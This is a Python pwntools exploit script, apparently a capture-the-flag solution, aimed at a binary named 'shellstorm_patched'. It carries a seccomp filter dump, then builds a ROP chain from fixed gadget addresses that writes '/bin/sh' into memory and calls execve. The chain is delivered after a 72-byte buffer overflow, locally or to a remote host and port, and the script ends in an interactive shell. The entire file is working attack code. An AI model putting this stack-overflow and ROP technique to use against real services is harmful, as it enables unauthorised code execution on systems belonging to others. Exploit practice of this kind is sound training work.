from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './shellstorm_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore")

# ===========================================================
# âžœ  shellstorm seccomp-tools dump ./shellstorm 
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
#  0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008
#  0006: 0x15 0x01 0x00 0x00000028  if (A == sendfile) goto 0008
#  0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0008: 0x06 0x00 0x00 0x00000000  return KILL
# ===========================================================

io = start()

pop_rax = p64(0x00000000004011a1) # pop rax; ret; 
pop_rdi = p64(0x00000000004011a3) # pop rdi; ret; 
pop_rsi = p64(0x00000000004011a5) # pop rsi; ret; 
pop_rdx = p64(0x00000000004011a7) # pop rdx; ret; 
syscall = p64(0x0000000000401196) # syscall; ret; 
write = p64(0x00000000004011a9) # mov qword ptr [rdi], rax; ret; 
data = p64(0x000000000404038)
offset = 72

# ===========================================================
# Write /bin/sh to 0x000000000404038
# pop rax, 0x2f62696e2f736800
# pop rdi, 0x000000000404038
# mov qword ptr [rdi], rax; ret; 
# ===========================================================

rop = b''
rop += pop_rax
rop += b"/bin/sh\x00"
rop += pop_rdi
rop += data
rop += write

# ===========================================================
# Set up register 
# pop rax, 0x3b
# pop rdi, 0x6b6000
# pop rsi, 0x0
# pop rdx, 0x0

# syscall
# ===========================================================

rop += pop_rax
rop += p64(0x3b)
rop += pop_rdi
rop += data
rop += pop_rsi
rop += p64(0x0)
rop += pop_rdx
rop += p64(0x0)
rop += syscall

offset = 72
io.sendline(b'A'*offset + rop)
payload = b'A'*offset + rop

io.interactive()
